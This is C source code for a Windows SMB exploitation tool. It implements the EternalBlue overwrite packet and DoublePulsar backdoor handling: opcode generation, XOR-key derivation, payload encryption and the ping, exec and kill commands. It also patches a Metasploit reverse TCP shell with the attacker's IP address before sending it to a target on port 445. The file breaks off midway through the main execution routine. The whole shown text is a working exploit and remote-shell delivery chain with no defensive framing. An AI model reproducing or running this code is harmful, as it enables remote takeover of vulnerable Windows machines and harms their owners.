#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>

#pragma pack(push, 1)

typedef struct _REQ_TRANSACTION_SECONDARY {
	BYTE WordCount;
	WORD TotalParameterCount;
	WORD TotalDataCount;
	WORD ParameterCount;
	WORD ParameterOffset;
	WORD ParameterDisplacement;
	WORD DataCount;
	WORD DataOffset;
	WORD DataDisplacement;
	WORD ByteCount;
	BYTE Buffer[1];
	//	UCHAR  Pad1[];
	//	UCHAR  Trans_Parameters[ParameterCount];
	//	UCHAR  Pad2[];
	//	UCHAR  Trans_Data[DataCount];
}REQ_TRANSACTION_SECONDARY, * PREQ_TRANSACTION_SECONDARY;

typedef struct _REQ_TRANSACTION2 {
	BYTE WordCount;
	WORD TotalParameterCount;
	WORD TotalDataCount;
	WORD MaxParameterCount;
	WORD MaxDataCount;
	BYTE MaxSetupCount;
	BYTE Reserved1;
	WORD Flags;
	DWORD Timeout;
	WORD Reserved2;
	WORD ParameterCount;
	WORD ParameterOffset;
	WORD DataCount;
	WORD DataOffset;
	BYTE SetupCount;
	BYTE Reserved3;
	BYTE Buffer[1];
}REQ_TRANSACTION2, * PREQ_TRANSACTION2;


typedef struct _RESP_TRANSACTION2 {
	BYTE WordCount;
	WORD TotalParameterCount;
	WORD TotalDataCount;
	WORD Reserved1;
	WORD ParameterCount;
	WORD ParameterOffset;
	WORD ParameterDisplacement;
	WORD DataCount;
	WORD DataDisplacement;
	BYTE SetupCount;
	BYTE Reserved2;
	BYTE Buffer[1];
}RESP_TRANSACTION2, * PRESP_TRANSACTION2;

typedef struct _REQ_TRANSACTION2_SECONDARY {
	BYTE WordCount;
	WORD TotalParameterCount;
	WORD TotalDataCount;
	WORD ParameterCount;
	WORD ParameterOffset;
	WORD ParameterDisplacement;
	WORD DataCount;
	WORD DataOffset;
	WORD DataDisplacement;
	WORD FID;
	WORD ByteCount;
	BYTE Buffer[1];
}REQ_TRANSACTION2_SECONDARY, * PREQ_TRANSACTION2_SECONDARY;

#pragma pack(pop)

#define SMB_COM_NEGOTIATE				0x72
#define SMB_COM_SESSION_SETUP_ANDX		0x73
#define SMB_COM_TREE_CONNECT			0x75
#define SMB_COM_TRANS					0x25
#define SMB_COM_TRANS_SECONDARY			0x26
#define SMB_COM_TRANS2					0x32

//from smbmacros.h
#define SMB_COM_TRANS2_SECONDARY		0x33
#define NETBIOS_SIZE_OFFSET				2U
#define SMB_HEADER_OFFSET				4U
#define SMB_PARAM_OFFSET				36
#define DOPU_PING_OPCODE				0x23
#define DOPU_EXEC_OPCODE				0xC8
#define DOPU_KILL_OPCODE				0x77

#define DOPU_ERROR_SUCCESS				0x10
#define DOPU_ERROR_ALLOCATION			0x30
#define DOPU_ERROR_PARAMETERS			0x20

#define SMB_FLAGS_LOCK_AND_READ_OK 0x01
#define SMB_FLAGS_BUF_AVAIL 0x2
#define SMB_FLAGS_CASE_INSENSITIVE 0x08
#define SMB_FLAGS_CANONICALIZED_PATHS 0x10
#define SMB_FLAGS_OPLOCK 0x20
#define SMB_FLAGS_REPLY 0x80



#define GetSocket(sockptr)		\
*(SOCKET *)(sockptr)
#define PutSocket(dest, value)	\
*(SOCKET *)(dest) = (value)

#define GetUshort(src)			\
*(WORD *)(src)
#define PutUshort(dst, val)		\
*(WORD *)(dst) = (val)

#define GetUlong(src)			\
*(DWORD *)(src)
#define PutUlong(dst, val)		\
*(DWORD *)(dst) = (val)

#define GetUlongPtr(src)		\
*(DWORD_PTR*)(src)
#define PutUlongPtr(dst, val)	\
*(DWORD_PTR *)(dst) = (val)

#define GetUlonglong(src)		\
*(ULONGLONG*)(src)
#define PutUlonglong(dest, value)	\
*(ULONGLONG *)(dest) = (value)

#define GetUnsigned(src)		\
*(unsigned *)(src)
#define PutUnsigned(dst, val)	\
*(unsigned *)(dst) = (val)


#define byteswap16(value)		\
((WORD)((((value) >> 8) & 0xFF) | (((value) & 0xFF) << 8)))
#define byteswap32(value)		\
((((value) & 0xFF000000) >> 24) | (((value) & 0x00FF0000) >> 8) | (((value) & 0xFF00) << 8) | (((value) & 0xFF) << 24))
#define byteswap64(value)		\
((((value) & 0xFF00000000000000ULL) >> 56)		\
|	(((value) & 0x00FF000000000000ULL) >> 40)	\
|	(((value) & 0x0000FF0000000000ULL) >> 24)	\
|	(((value) & 0x000000FF00000000ULL) >> 8)	\
|	(((value) & 0x00000000FF000000ULL) << 8)	\
|	(((value) & 0x0000000000FF0000ULL) << 24)	\
|	(((value) & 0x000000000000FF00ULL) << 40)	\
|	(((value) & 0x00000000000000FFULL) << 56))

#define badsock(sfd)	\
((BOOLEAN)((sfd) == INVALID_SOCKET) ? TRUE : FALSE)
#define validsock(sfd)	\
((BOOLEAN)((sfd) != INVALID_SOCKET) ? TRUE : FALSE)

#define isnull(x)		\
((BOOLEAN)((x) == NULL) ? TRUE : FALSE)
#define notnull(x)		\
((BOOLEAN)((x) != NULL) ? TRUE : FALSE)

#define issockerr(status)	\
((BOOLEAN)((status) == SOCKET_ERROR) ? TRUE : FALSE)

#define MAKEUNSIGNED(x)		\
((unsigned)(x))
#define MAKEPBYTE(x)		\
((PBYTE)(x))
#define MAKEPSMB(x)			\
((PSMB_HEADER)(x))
#define MAKEPWSTR(x)		\
((PWSTR)(x))
#define MAKEPCWSTR(x)		\
((PCWSTR)(x))
#define MAKEPWORD(x)		\
((WORD *)(x))
#define MAKEPDWORD(x)		\
((DWORD *)(x))
#define MAKEPVOID(x)		\
((PVOID)(x))


DWORD __stdcall GetDoublePulsarStatusCode(BUFFER* IN bws, BUFFER IN* request)
{
	DWORD status = 0;
	PSMB_HEADER smbresp = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET), smbreq = MAKEPSMB(request->pbdata + SMB_PARAM_OFFSET);
	PRESP_TRANSACTION2 trans2resp = (PRESP_TRANSACTION2)(bws->pbdata + SMB_PARAM_OFFSET);
	PREQ_TRANSACTION2 trans2req = (PREQ_TRANSACTION2)(request->pbdata + SMB_PARAM_OFFSET);

	status = (DWORD)(GetUshort(&smbresp->Mid) - GetUshort(&smbreq->Mid));
	status &= 0xFFUL;

	return status;
}

DWORD __stdcall GetDoublePulsarOpCode(BUFFER* IN bws)
{
	DWORD opcode = 0, t = 0;
	PREQ_TRANSACTION2 trans2 = (PREQ_TRANSACTION2)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUlong(&t, GetUlong(&trans2->Timeout));
	opcode = ((t)+(t >> 8) + (t >> 16) + (t >> 24));

	return (opcode & 0xFF);
}

BOOL __stdcall GenerateDoublePulsarOpcodePacket(BUFFER* IN OUT bws, BYTE opcode)
{
	DWORD op = 0, k = 0, t = 0;
	PREQ_TRANSACTION2 trans2 = NULL;
	PSMB_HEADER smb = NULL;

	op = opcode;
	//PutUnsigned(&k, random());
	csprng(MAKEPBYTE(&k), sizeof(k));
	t = 0xFF & (op - ((k & 0xFFFF00) >> 16) - (0xFFFF & (k & 0xFF00) >> 8)) | k & 0xFFFF00;


	smb = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	trans2 = (PREQ_TRANSACTION2)(bws->pbdata + SMB_PARAM_OFFSET);
	PutUlong(&trans2->Timeout, GetUlong(&t));

	if (!cmp(smb->Protocol, "\xFFSMB", 4))
		return FALSE;
	else
		return TRUE;
}

DWORD __stdcall GetDoublePulsarXorKey(BUFFER* IN bws)
{
	ULONGLONG s = 0;
	ULARGE_INTEGER x = { 0 };
	PSMB_HEADER smb = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);

	s = byteswap64(GetUlonglong(smb->SecuritySignature));
	s = GetUlonglong(smb->SecuritySignature);

	x.QuadPart = (2 * s ^ (((s & 0xFF00 | (s << 16)) << 8) | (((s >> 16) | s & 0xFF0000) >> 8)));

	return (x.LowPart & 0xFFFFFFFF);
}


BOOL __stdcall XorEncryptPayload(BUFFER IN OUT* payload, DWORD IN xorkey)
{
	static BUFFER tmp;
	DWORD doublewordsize = 0, remainder = 0, * dwptr = NULL, i = 0;

	if (isnull(payload) || !GetUlong(&xorkey))
		return FALSE;

	if (payload->dwsize % 0x1000)
		return FALSE;

	doublewordsize = (payload->dwsize / sizeof(DWORD));
	dwptr = MAKEPDWORD(payload->pbdata);

	for (i = 0; i < doublewordsize; i++)
		dwptr[i] ^= xorkey;

	return TRUE;
}

WORD get_pid(smb_info* i)
{
	return GetUshort(&i->pid);
}

WORD get_uid(smb_info* i)
{
	return GetUshort(&i->uid);
}

WORD get_mid(smb_info* i)
{
	return GetUshort(&i->mid);
}

WORD get_tid(smb_info* i)
{
	return GetUshort(&i->tid);
}

WORD get_fid(smb_info* i)
{
	return GetUshort(&i->fid);
}

WORD get_special_mid(smb_info* i)
{
	return GetUshort(&i->special_mid);
}

WORD get_special_pid(smb_info* i)
{
	return GetUshort(&i->special_pid);
}

WORD get_datadisplacement(smb_info* i)
{
	return GetUshort(&i->DataDisplacement);
}


void set_pid(smb_info* i, WORD pid)
{
	PutUshort(&i->pid, pid);
}

void set_uid(smb_info* i, WORD uid)
{
	PutUshort(&i->uid, uid);
}

void set_mid(smb_info* i, WORD mid)
{
	PutUshort(&i->mid, mid);
}

void set_tid(smb_info* i, WORD tid)
{
	PutUshort(&i->tid, tid);
}

void set_fid(smb_info* i, WORD fid)
{
	PutUshort(&i->fid, fid);
}

void set_special_mid(smb_info* i, WORD special_mid)
{
	PutUshort(&i->special_mid, special_mid);
}

void set_special_pid(smb_info* i, WORD special_pid)
{
	PutUshort(&i->special_pid, special_pid);
}

void set_datadisplacement(smb_info* i, WORD datadisplacement)
{
	PutUshort(&i->DataDisplacement, datadisplacement);
}


void bwsalloc(BUFFER OUT* bws, DWORD IN size)
{
	SIZE_T siz = size;
	*bws = { 0 };
	bws->dwsize += size;
#ifdef EXEC_ALLOC
	bws->pbdata = MAKEPBYTE(VirtualAlloc(NULL, siz, MEM_COMMIT, PAGE_EXECUTE_READWRITE));
#else
	bws->pbdata = MAKEPBYTE(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, siz));
#endif // EXEC_ALLOC

	if (isnull(bws->pbdata))
	{
		errmsg(__FUNCSIG__, __LINE__, GetLastError() | STATUS_NO_MEMORY);
		return;
	}

	RtlZeroMemory(bws->pbdata, siz);
	return;
}

void bwsfree(BUFFER IN* bws)
{
#ifdef EXEC_ALLOC
	if (notnull(bws->pbdata))
		if (!VirtualFree(bws->pbdata, 0, MEM_RELEASE))
			errmsg(__FUNCSIG__, __LINE__, GetLastError());
#else
	if (notnull(bws->pbdata))
		if (!HeapFree(GetProcessHeap(), 0, bws->pbdata))
			errmsg(__FUNCSIG__, __LINE__, GetLastError());
#endif // EXEC_ALLOC
	RtlZeroMemory(bws, sizeof(BUFFER));
	return;
}

PBYTE doublepulsar_installation_shellcode(BUFFER IN OUT* bws)
{
	bwsalloc(bws, NETBIOS_SESSION_SERVICE_DOUBLE_PULSAR_SHELLCODE_SIZE);
	cpy(bws->pbdata, NETBIOS_SESSION_SERVICE_DOUBLE_PULSAR_SHELLCODE, bws->dwsize);

	return bws->pbdata;
}


PBYTE trans2_secondary_fid_zero_eternalblue_overwrite_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD mid, WORD tid, WORD DataDisplacement)
{
	PSMB_HEADER h = NULL;
	PREQ_TRANSACTION2_SECONDARY trans = NULL;

	bwsalloc(bws, TRANS2_SECONDARY_FID_ZERO_ETERNALBLUE_OVERWRITE_PACKET_SIZE);
	cpy(bws->pbdata, TRANS2_SECONDARY_FID_ZERO_ETERNALBLUE_OVERWRITE_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	trans = (PREQ_TRANSACTION2_SECONDARY)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	PutUshort(&trans->DataDisplacement, DataDisplacement);

	return bws->pbdata;
}



PBYTE trans2_session_setup_dopu_ping(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	HMODULE lib = NULL;
	packet_creation_handler_type_one create_packet = NULL;

	lib = SmbLibraryInitialize();
	if (isnull(lib))
		return FALSE;
	
	create_packet = (packet_creation_handler_type_one)GetProcAddress(lib, "trans2_session_setup_dopu_ping");
	if (isnull(create_packet))
		return FALSE;

	return create_packet(bws, pid, uid, mid, tid);
}

PBYTE trans2_session_setup_dopu_kill(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	HMODULE lib = NULL;
	packet_creation_handler_type_one create_packet = NULL;

	lib = SmbLibraryInitialize();
	create_packet = (packet_creation_handler_type_one)GetProcAddress(lib, "trans2_session_setup_dopu_kill");

	if (isnull(lib) || isnull(create_packet))
		return FALSE;

	return create_packet(bws, pid, uid, mid, tid);
}

PBYTE trans2_session_setup_dopu_exec(BUFFER IN OUT* bws, BUFFER IN* xorkeypacket, BUFFER IN* payload, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	HMODULE lib = NULL;
	packet_creation_handler_type_six create_packet = NULL;
	
	lib = SmbLibraryInitialize();
	
	if (isnull(lib))
		return NULL;

	create_packet = (packet_creation_handler_type_six)GetProcAddress(lib, "trans2_session_setup_dopu_exec");

	if (isnull(create_packet))
		return NULL;

	return create_packet(bws, xorkeypacket, payload, pid, uid, mid, tid);
}


PBYTE tree_disconnect_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PSMB_HEADER h = NULL;
	PRESP_TRANSACTION_INTERIM treedisconnect = NULL;

	bwsalloc(bws, DOUBLE_PULSAR_TREE_DISCONNECT_PACKET_SIZE);
	cpy(bws->pbdata, DOUBLE_PULSAR_TREE_DISCONNECT_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);
	treedisconnect = (PRESP_TRANSACTION_INTERIM)(bws->pbdata + SMB_PARAM_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

PBYTE logoff_andx_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid)
{
	PSMB_HEADER h = NULL;

	bwsalloc(bws, DOUBLE_PULSAR_LOGOFF_ANDX_PACKET_SIZE);
	cpy(bws->pbdata, DOUBLE_PULSAR_LOGOFF_ANDX_PACKET, bws->dwsize);

	h = MAKEPSMB(bws->pbdata + SMB_HEADER_OFFSET);

	PutUshort(&h->Pid, pid);
	PutUshort(&h->Uid, uid);
	PutUshort(&h->Mid, mid);
	PutUshort(&h->Tid, tid);

	return bws->pbdata;
}

unsigned int SendData(BUFFER IN OUT* bws, SOCKET& s, unsigned int& status)
{
	status = 0;

	if (badsock(s))
		return MAKEUNSIGNED(WSAGetLastError());

	*(int*)(&status) = send(s, (const char*)bws->pbdata, *(int*)(&bws->dwsize), 0);
	return status;
}

unsigned int RecvData(BUFFER IN OUT* bws, DWORD IN bufsize, SOCKET& s, unsigned int& status)
{
	bwsalloc(bws, bufsize);

	if (badsock(s))
		return MAKEUNSIGNED(WSAGetLastError());

	*(int*)(&status) = recv(s, (char*)bws->pbdata, *(int*)(&bws->dwsize), 0);
	return status;
}


BOOLEAN SendRecvTrans2SessionSetup(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_one create_packet = &trans2_session_setup_packet;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);

	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	return TRUE;
}

BOOLEAN SendRecvDoublePulsarInstallationShellcode(RequestPacketLinkedList OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_five create_packet = &doublepulsar_installation_shellcode;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv)))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	inbound->ThisNetbiosSize = NULL, inbound->ThisSmb = NULL;
	outbound->ThisNetbiosSize = NULL, outbound->ThisSmb = NULL;

	return TRUE;
}

BOOLEAN SendRecvTrans2SessionSetupPing(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_one create_packet = &trans2_session_setup_dopu_ping;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);

	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	return TRUE;
}

BOOLEAN SendRecvTrans2SessionSetupKill(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_one create_packet = &trans2_session_setup_dopu_kill;

	if (isnull(outbound) || isnull(inbound) || isnull(info))
		return FALSE;

	if (badsock(s))
		return FALSE;

	if (isnull(create_packet))
		return FALSE;

	if (isnull(create_packet(srv, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
		return FALSE;

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	PutUnsigned(recvsize, RecvData(client, 0x400, s, GetUnsigned(recvsize + 1)));

	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;

	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);

	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);

	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;

	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);

	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;

	return TRUE;
}


BOOLEAN SendRecvTrans2SessionSetupExec(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info, BUFFER IN* xorkeypacket, BUFFER IN* payload)
{
	static unsigned int sendsize[2], recvsize[2];
	BUFFER* srv = &outbound->ThisPacket, * client = &inbound->ThisPacket, tmp = { 0 };
	packet_creation_handler_type_six create_packet = &trans2_session_setup_dopu_exec;

	if (isnull(outbound) || isnull(inbound) || isnull(info) || isnull(xorkeypacket) || isnull(payload))
	{
		SetLastError(STATUS_INVALID_PARAMETER);
		return FALSE;
	}

	if (badsock(s))
	{
		SetLastError(((WSAGetLastError() != 0) ? WSAGetLastError() : STATUS_INVALID_PARAMETER));
		return FALSE;
	}

	if (isnull(create_packet))
	{
		SetLastError(STATUS_INVALID_PARAMETER);
		return FALSE;
	}

	if (isnull(create_packet(srv, xorkeypacket, payload, get_pid(info), get_uid(info), get_mid(info), get_tid(info))))
	{
		if (!GetLastError())
			SetLastError(STATUS_FAIL);
		return FALSE;
	}

	PutUnsigned(sendsize, SendData(srv, s, GetUnsigned(sendsize + 1)));

	if (!GetUlong(sendsize) || issockerr(GetUlong(sendsize)))
		return FALSE;

	/*PutUnsigned(recvsize, RecvData(client, 0x1000, s, GetUnsigned(recvsize + 1)));
	if (!GetUlong(recvsize) || issockerr(GetUlong(recvsize)))
		return FALSE;
	bwsalloc(&tmp, GetUlong(recvsize));
	cpy(tmp.pbdata, client->pbdata, tmp.dwsize);
	bwsfree(client);
	bwsalloc(client, tmp.dwsize);
	cpy(client->pbdata, tmp.pbdata, client->dwsize);
	bwsfree(&tmp);
	inbound->ThisNetbiosSize = client->pbdata + NETBIOS_SIZE_OFFSET;
	outbound->ThisNetbiosSize = srv->pbdata + NETBIOS_SIZE_OFFSET;
	inbound->ThisSmb = MAKEPSMB(client->pbdata + SMB_HEADER_OFFSET);
	outbound->ThisSmb = MAKEPSMB(srv->pbdata + SMB_HEADER_OFFSET);
	if (!cmp(inbound->ThisSmb->Protocol, "\xFFSMB", 4))
		return FALSE;*/
	return TRUE;
}

DWORD __stdcall DoublePulsarExecuteShellcode(PVOID pvip)
{
	BUFFER tmp = { 0 }, shellcode = { 0 };
	PCSTR paramip = (PCSTR)pvip;
	UNICODE_STRING wip = { 0 }, shellcodefilename = { 0 };
	STRING ip = { 0 };
	static smb_info info;
	static RequestPacketLinkedList requests[0x20], * req;
	static ResponsePacketLinkedList responses[0x20], * resp;
	DWORD i = 0, j = 0, currententryval = 0, numberofreqentries = 0x20, leakentrycount = 0x8, attempts = 3, groomcount = 0, numberofrespentries = 0x20, numberoftransentries = 8;
	WORD tmpmid = 0;
	SOCKET s[2] = { 0 };
	WSAData wsa = { 0 };
	sockaddr_in sa[2] = { 0 };
	unsigned status[0x10] = { 0 }, * connectstatus = (status + 1);
	BOOLEAN bstatus = 0;
	static ANYPOINTER any;
	static DWORD smbrequestandresponsecount;
	static BYTE newshellcodeipraw[sizeof(DWORD)];
	PTRANS_REQUEST_LIST transactionreqlist = NULL, transreqentry = NULL;
	PTRANS_RESPONSE_LIST transactionresplist = NULL, transrespentry = NULL;

	InitString(paramip, &ip);
	ConvertStringToUnicode(&ip, &wip);
	InitString(ThisMachinesIpAddress.Buffer, &info.AttackingIPAddress);
	//InitUnicodeString(DOUBLE_PULSAR_SHELLCODE_TO_EXECUTE_FILENAME, &shellcodefilename);

	info.sockaddrpointer = sa;
	info.socketpointer = s;
	info.wsapointer = &wsa;

	info.connection_handle += (random() % 0x1000);

	set_pid(&info, 65279);
	set_mid(&info, 64);
	set_tid(&info, 0);
	set_uid(&info, 0);

	//setup request list

	for (i = 0, j = 0; i < numberofreqentries; i++)
	{
		req = &requests[i];
		j = (i + 1);
		if (j == numberofreqentries)
		{
			req->NextEntry = NULL;
		}
		else if (j < numberofreqentries)
		{
			req->NextEntry = &requests[j];
		}
	}

	req = requests;

	//setup response list
	for (i = 0, j = 0; i < numberofrespentries; i++)
	{
		resp = (responses + i), j = (i + 1);

		if (j == numberofrespentries)
		{
			resp->NextEntry = NULL;
		}
		else if (j < numberofrespentries)
		{
			resp->NextEntry = (responses + j);
		}
	}
	resp = responses;

	/*	
	if (!readfile(&shellcodefilename, &shellcode))
	{
		if (notnull(ip.Buffer))
			FreeString(&ip);
		if (notnull(wip.Buffer))
			FreeUnicodeString(&wip);
	
		
		PutUlong(status, ((GetLastError() != 0) ? GetLastError() : STATUS_FAIL));
		errmsg(__FUNCTION__, __LINE__, GetUlong(status));
		dbgprint("[%S]: SMBLibrary.dll!readfile failed on line %u", __FUNCTION__, __LINE__);
		
		return GetUlong(status);
	}
	*/

	//copy our shellcode from read only memory
	bwsalloc(&shellcode, METASPLOIT_REVERSE_TCP_SHELL_SIZE);
	cpy(shellcode.pbdata, METASPLOIT_REVERSE_TCP_SHELL, shellcode.dwsize);
	
	//copy our ip address from a global variable
	bwsalloc(&tmp, info.AttackingIPAddress.MaximumLength);
	cpy(tmp.pbdata, info.AttackingIPAddress.Buffer, info.AttackingIPAddress.Length);


	//we do all of the following to convert the ip address string to it's 4 byte representation in hex
	if (!find_memory_pattern(&tmp, &any, ".", sizeof(BYTE)))
	{
		PutUlong(status, STATUS_FAIL);
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		bwsfree(&shellcode);
		bwsfree(&tmp);
		return GetUlong(status);
	}

	*(any.ppointer) = '\0';

	if (!find_memory_pattern(&tmp, &any, ".", sizeof(BYTE)))
	{
		PutUlong(status, STATUS_FAIL);
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		bwsfree(&shellcode);
		bwsfree(&tmp);
		return GetUlong(status);
	}

	*(any.ppointer) = '\0';

	if (!find_memory_pattern(&tmp, &any, ".", sizeof(BYTE)))
	{
		PutUlong(status, STATUS_FAIL);
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		bwsfree(&shellcode);
		bwsfree(&tmp);
		return GetUlong(status);
	}

	*(any.ppointer) = '\0';

	any.pvpointer = tmp.pbdata;
	newshellcodeipraw[0] = LOBYTE(atol(any.ppointer));

	while (*(any.ppointer) != 0x00)
		any.address++;

	any.address++;
	newshellcodeipraw[1] = LOBYTE(atol(any.ppointer));

	while (*(any.ppointer) != 0x00)
		any.address++;

	any.address++;
	newshellcodeipraw[2] = LOBYTE(atol(any.ppointer));
	
	while (*(any.ppointer) != 0x00)
		any.address++;

	any.address++;
	newshellcodeipraw[3] = LOBYTE(atol(any.ppointer));

	RtlZeroMemory(&any, sizeof(any));
	bwsfree(&tmp);

	if (!find_memory_pattern(&shellcode, &any, "\x7f\x00\x00\x01", 4))
	{
		PutUlong(status, STATUS_FAIL);
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		bwsfree(&shellcode);
		return GetUlong(status);
	}

	RtlZeroMemory(any.pbpointer, sizeof(newshellcodeipraw));
	RtlCopyMemory(any.pbpointer, newshellcodeipraw, sizeof(newshellcodeipraw));
	

	//try to get double pulsar to execute shellcode on our target machine without crashing it!
	do
	{
		if (!AllocateAndSetupTransactionRequestList(&transactionreqlist, GetUlong(&numberoftransentries)))
		{
			if (!GetLastError())
				PutUlong(status, STATUS_NO_MEMORY), SetLastError(GetUlong(status));
			else
				PutUlong(status, GetLastError());
			errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
			bwsfree(&shellcode);
			bstatus = FALSE;
			break;
		}

		transreqentry = transactionreqlist->Flink;

		if (!AllocateAndSetupTransactionResponseList(&transactionresplist, GetUlong(&numberoftransentries)))
		{
			if (!GetLastError())
				PutUlong(status, STATUS_NO_MEMORY), SetLastError(GetUlong(status));
			else
				PutUlong(status, GetLastError());
			errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
			bwsfree(&shellcode);
			FreeTransactionRequestList(&transactionreqlist);
			bstatus = FALSE;
			break;
		}

		transrespentry = transactionresplist->Flink;

		PutUnsigned(connectstatus, TargetConnect(GetSocket(s), *sa, wsa, ip.Buffer, GetUnsigned(status)));

		if ((GetUlong(connectstatus) != 0) || (GetUlong(status) != 0))
		{
			dbgprint("[%S]: %S could not connect to the target %ws:%u...\n", __FUNCTION__, "TargetConnect", wip.Buffer, 445U);
			bstatus = FALSE;
			break;
		}

		bstatus = SendRecvNegotiate(req, resp, GetSocket(s), &info);
		++smbrequestandresponsecount;

